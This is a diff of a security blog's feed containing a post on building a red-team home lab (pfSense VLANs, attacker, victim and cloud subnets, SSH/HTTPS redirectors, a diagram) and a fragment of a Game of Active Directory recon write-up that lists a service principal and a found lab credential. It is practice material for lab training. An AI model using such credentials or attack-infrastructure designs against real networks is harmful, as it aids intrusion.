parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;428.75\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-24\&quot; value=\&quot;172.16.120.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;580\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-25\&quot; value=\&quot;172.16.50.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;300.38\&quot; y=\&quot;550\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-26\&quot; value=\&quot;172.16.10.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;60.00000000000001\&quot; y=\&quot;500\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-27\&quot; value=\&quot;Attacker-Network\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;50.00000000000001\&quot; y=\&quot;200\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-28\&quot; value=\&quot;Public Cloud Services\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;297.26\&quot; y=\&quot;160\&quot; width=\&quot;133.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-29\&quot; value=\&quot;Complete Victim Network\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;554.13\&quot; y=\&quot;110\&quot; width=\&quot;200\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-33\&quot; value=\&quot;SSH\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontStyle=1;fontSize=14;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;194.13\&quot; y=\&quot;380\&quot; width=\&quot;60\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-34\&quot; value=\&quot;HTTPS\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;fontStyle=1;fontSize=14;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;449.13\&quot; y=\&quot;380\&quot; width=\&quot;70\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-35\&quot; value=\&quot;\&quot; style=\&quot;rounded=1;whiteSpace=wrap;html=1;fillColor=none;strokeWidth=3;glass=0;strokeColor=#EDEDED;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;24\&quot; y=\&quot;70\&quot; width=\&quot;780\&quot; height=\&quot;590\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;/root&gt;&lt;/mxGraphModel&gt;&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div>
+    <script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script>
+  </body></html>
+<p><br /></p>
+
+<p>Here the networking can be as simple as above or it can go as complex as possible depending on your imagination how you wanted to create the whole environment.</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">Attacker Network</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.10.0/24</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Public Cloud Services</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.50.0/24</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Complete Victim Network</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.100.0/24</code>, <code class="language-plaintext highlighter-rouge">172.16.110.0/24</code>, <code class="language-plaintext highlighter-rouge">172.16.120.0/24</code></li>
+</ol>
+
+<p>The reason behind using multiple Victim networks is to have multiple environments in the LAB where there is some consistency can be seen, when ever you wanted to deploy new labs and stuff like that. In my case I’ve couple of Labs set in the victim network.</p>
+
+<ol>
+  <li>GOAD [The Game Of Active Directory]</li>
+  <li>SCCM / MECM LAB</li>
+</ol>
+
+<p>Both the labs are build by <code class="language-plaintext highlighter-rouge"># Orange Cyberdefense</code>. So, from the above structure, I’ve my Victim network as follows.</p>
+
+<ol>
+  <li>GOAD -&gt; <code class="language-plaintext highlighter-rouge">172.16.100.0/24</code></li>
+  <li>SCCM -&gt; <code class="language-plaintext highlighter-rouge">172.16.110.0/24</code></li>
+</ol>
+
+<blockquote class="notice--info">
+  <p>So now the question is how to setup this using <code class="language-plaintext highlighter-rouge">pfsense</code>?</p>
+</blockquote>
+
+<p>The above networking is achieved by setting up multiple V-LANS in <code class="language-plaintext highlighter-rouge">PFSense</code> firewall and adding firewall rules. Also, will be covering the networking part of the story using <code class="language-plaintext highlighter-rouge">PFSense</code>. The story kept for some other day.</p>
+
+<h3 id="stay-tuned-for-the-upcoming-blog">Stay tuned for the upcoming blog!!</h3>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[How to Setup a Red-Teams infrastructure at Home]]></summary></entry><entry><title type="html">Game of Active Directory - Part 3 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p3/" rel="alternate" type="text/html" title="Game of Active Directory - Part 3 [Recon]" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p3</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p3/"><![CDATA[<h4 id="previously">Previously:</h4>
 <p>Found two user names and passwords for the users, <code class="language-plaintext highlighter-rouge">Samwell.tarly</code> and <code class="language-plaintext highlighter-rouge">Brandon.stark</code>.</p>
 
 <p>Note: A good thing to note in here is to not use any password spraying as there is a high 
@@ -369,98 +679,7 @@ MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                    
 <p>Creds Found:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user : north/jon.snow:iknownothing
-</code></pre></div></div>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD" /><category term="HomeLab" /><category term="Active-Drirectory" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">RED-TEAM Home-Lab Infra</title><link href="http://localhost:4000/red-team/RED-TEAM-Infra/" rel="alternate" type="text/html" title="RED-TEAM Home-Lab Infra" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/red-team/RED-TEAM-Infra</id><content type="html" xml:base="http://localhost:4000/red-team/RED-TEAM-Infra/"><![CDATA[<p>After looking at a bunch of blogs from the other security folks about RED-Teaming. It started to bug my mind that how is all the setup done form the infrastructure side of things.</p>
-
-<p>Taking the advantage from the experience of creating a home lab environment, using multiple hypervisors and networking. I decided to have my own infrastructure in my home lab. This home lab will contain a lot of things that will be related to starting from..</p>
-
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">Networking</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Multiple VMs</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Multiple DMZs</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Isolations</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Netowork traffic</code></li>
-  <li><code class="language-plaintext highlighter-rouge">The victim network</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Attacking infrstructure</code> which will contain
-    <ol>
-      <li><code class="language-plaintext highlighter-rouge">Single/Multiple Redirectors</code></li>
-      <li><code class="language-plaintext highlighter-rouge">The attack box</code>
-        <ol>
-          <li><code class="language-plaintext highlighter-rouge">Windows Machine</code></li>
-          <li><code class="language-plaintext highlighter-rouge">Linux [Kali]</code></li>
-        </ol>
-      </li>
-    </ol>
-  </li>
-  <li><code class="language-plaintext highlighter-rouge">Assumed Public Cloud infrastructure</code>
-    <ol>
-      <li><code class="language-plaintext highlighter-rouge">This is where the redirectors stay</code></li>
-    </ol>
-  </li>
-  <li><code class="language-plaintext highlighter-rouge">Using Pfsense firewall</code> to accomplish all the above activity.</li>
-</ol>
-
-<p>I’ve divided the Infra into 3 Parts, which is as follows.</p>
-
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">Victim-Network</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Assumed Public-Cloud</code></li>
-  <li><code class="language-plaintext highlighter-rouge">Attacking-Network</code></li>
-</ol>
-
-<p>From the previous home-lab blog, I’ve showed the configuration of the <code class="language-plaintext highlighter-rouge">HP-Proliant</code> enterprise grade server. This server is a beast to run all the number of <code class="language-plaintext highlighter-rouge">virtual machines</code> that I wanted to execute for the infra.</p>
-
-<blockquote>
-  <p>Interested how the setup looks like? <a href="https://dcodezero.github.io/it/Homelab/">Check it</a></p>
-</blockquote>
-
-<p>Below are some of the things that I strictly wanted to have in my LAB. This helps my in defining the things for further or future upgrades that I wanted to have in my LAB.</p>
-
-<ol>
-  <li>Attacker network should not directly talk or communicate with the victim network.</li>
-  <li>Victim network should not directly talk or communicate with the Attacker network.</li>
-  <li>The <code class="language-plaintext highlighter-rouge">Victim or the attacker</code> networks can only communicate to the <code class="language-plaintext highlighter-rouge">public cloud</code>.</li>
-  <li>Here the bridge/communication between these two networks is only via <code class="language-plaintext highlighter-rouge">Public Cloud-Network</code>.</li>
-  <li>Due to security constraints/reasons, the victim network only allow the egress traffic to the <code class="language-plaintext highlighter-rouge">public cloud</code> via port <code class="language-plaintext highlighter-rouge">443</code> <code class="language-plaintext highlighter-rouge">HTTPS</code>.</li>
-  <li>Along the other side to keep the attacking infra safe, the attacking network will only communicate to the <code class="language-plaintext highlighter-rouge">Public cloud</code> via <code class="language-plaintext highlighter-rouge">22</code> <code class="language-plaintext highlighter-rouge">SSH</code> by tunneling the traffic using redirectors.</li>
-</ol>
-
-<p>I’ve created a small Network Diagram to show how the idea is going to work.</p>
-
-<html><head><title>RTIL.drawio.html</title><meta charset="utf-8" /></head><body>
-    <div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; agent=\&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15\&quot; version=\&quot;25.0.3\&quot;&gt;&lt;diagram name=\&quot;Page-1\&quot; id=\&quot;J8HO-rfsxQq54d3A0VBy\&quot;&gt;&lt;mxGraphModel dx=\&quot;1224\&quot; dy=\&quot;774\&quot; grid=\&quot;1\&quot; gridSize=\&quot;10\&quot; guides=\&quot;1\&quot; tooltips=\&quot;1\&quot; connect=\&quot;1\&quot; arrows=\&quot;1\&quot; fold=\&quot;1\&quot; page=\&quot;1\&quot; pageScale=\&quot;1\&quot; pageWidth=\&quot;827\&quot; pageHeight=\&quot;1169\&quot; math=\&quot;0\&quot; shadow=\&quot;0\&quot;&gt;&lt;root&gt;&lt;mxCell id=\&quot;0\&quot;/&gt;&lt;mxCell id=\&quot;1\&quot; parent=\&quot;0\&quot;/&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-1\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;160\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-3\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;320\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-4\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;470\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-7\&quot; value=\&quot;\&quot; style=\&quot;points=[];aspect=fixed;html=1;align=center;shadow=0;dashed=0;fillColor=#FF6A00;strokeColor=none;shape=mxgraph.alibaba_cloud.aliyun_linux;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;324.13\&quot; y=\&quot;250\&quot; width=\&quot;72.5\&quot; height=\&quot;72.5\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-8\&quot; value=\&quot;\&quot; style=\&quot;image;sketch=0;aspect=fixed;html=1;points=[];align=center;fontSize=12;image=img/lib/mscae/VM_Linux_Non_Azure.svg;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;84.13\&quot; y=\&quot;290\&quot; width=\&quot;71.74\&quot; height=\&quot;66\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-9\&quot; value=\&quot;\&quot; style=\&quot;image;sketch=0;aspect=fixed;html=1;points=[];align=center;fontSize=12;image=img/lib/mscae/VirtualMachineWindows.svg;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;84.13\&quot; y=\&quot;390\&quot; width=\&quot;71.74\&quot; height=\&quot;66\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-12\&quot; value=\&quot;\&quot; style=\&quot;points=[];aspect=fixed;html=1;align=center;shadow=0;dashed=0;fillColor=#FF6A00;strokeColor=none;shape=mxgraph.alibaba_cloud.aliyun_linux;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;325.13\&quot; y=\&quot;407.5\&quot; width=\&quot;72.5\&quot; height=\&quot;72.5\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-32\&quot; style=\&quot;edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=1;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#97D077;\&quot; edge=\&quot;1\&quot; parent=\&quot;1\&quot; source=\&quot;h3hSjAzG3KHHkQH4Dxe3-13\&quot; target=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot;&gt;&lt;mxGeometry relative=\&quot;1\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-13\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#f5ec00;strokeWidth=3;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;544.13\&quot; y=\&quot;135\&quot; width=\&quot;220\&quot; height=\&quot;480\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#00c7fc;strokeWidth=4;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;304.13\&quot; y=\&quot;200\&quot; width=\&quot;120\&quot; height=\&quot;350\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-31\&quot; style=\&quot;edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;strokeWidth=3;strokeColor=#FFB570;\&quot; edge=\&quot;1\&quot; parent=\&quot;1\&quot; source=\&quot;h3hSjAzG3KHHkQH4Dxe3-15\&quot; target=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot;&gt;&lt;mxGeometry relative=\&quot;1\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-15\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#FF9933;strokeWidth=3;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;60.00000000000001\&quot; y=\&quot;250\&quot; width=\&quot;120\&quot; height=\&quot;250\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-16\&quot; value=\&quot;Redirector -1\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;330.38\&quot; y=\&quot;330\&quot; width=\&quot;73.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-17\&quot; value=\&quot;Redirector -2\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;327.25\&quot; y=\&quot;490\&quot; width=\&quot;73.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-18\&quot; value=\&quot;Victim-Network-01\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;260\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-19\&quot; value=\&quot;Victim-Network-02&amp;lt;span style=&amp;quot;caret-color: rgba(0, 0, 0, 0); font-family: monospace; font-size: 0px; text-align: start; white-space: nowrap;&amp;quot;&amp;gt;%3CmxGraphModel%3E%3Croot%3E%3CmxCell%20id%3D%220%22%2F%3E%3CmxCell%20id%3D%221%22%20parent%3D%220%22%2F%3E%3CmxCell%20id%3D%222%22%20value%3D%22Victim-Network-01%22%20style%3D%22text%3Bhtml%3D1%3Balign%3Dcenter%3BverticalAlign%3Dmiddle%3BwhiteSpace%3Dwrap%3Brounded%3D0%3B%22%20vertex%3D%221%22%20parent%3D%221%22%3E%3CmxGeometry%20x%3D%22600%22%20y%3D%22170%22%20width%3D%22140%22%20height%3D%2230%22%20as%3D%22geometry%22%2F%3E%3C%2FmxCell%3E%3C%2Froot%3E%3C%2FmxGraphModel%3E&amp;lt;/span&amp;gt;\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;407.5\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-20\&quot; value=\&quot;Victim-Network-03\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;560\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-21\&quot; value=\&quot;172.16.100.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;280\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-23\&quot; value=\&quot;172.16.110.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;428.75\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-24\&quot; value=\&quot;172.16.120.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;580\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-25\&quot; value=\&quot;172.16.50.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;300.38\&quot; y=\&quot;550\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-26\&quot; value=\&quot;172.16.10.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;60.00000000000001\&quot; y=\&quot;500\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-27\&quot; value=\&quot;Attacker-Network\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;50.00000000000001\&quot; y=\&quot;200\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-28\&quot; value=\&quot;Public Cloud Services\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;297.26\&quot; y=\&quot;160\&quot; width=\&quot;133.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-29\&quot; value=\&quot;Complete Victim Network\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;554.13\&quot; y=\&quot;110\&quot; width=\&quot;200\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-33\&quot; value=\&quot;SSH\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontStyle=1;fontSize=14;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;194.13\&quot; y=\&quot;380\&quot; width=\&quot;60\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-34\&quot; value=\&quot;HTTPS\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;fontStyle=1;fontSize=14;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;449.13\&quot; y=\&quot;380\&quot; width=\&quot;70\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-35\&quot; value=\&quot;\&quot; 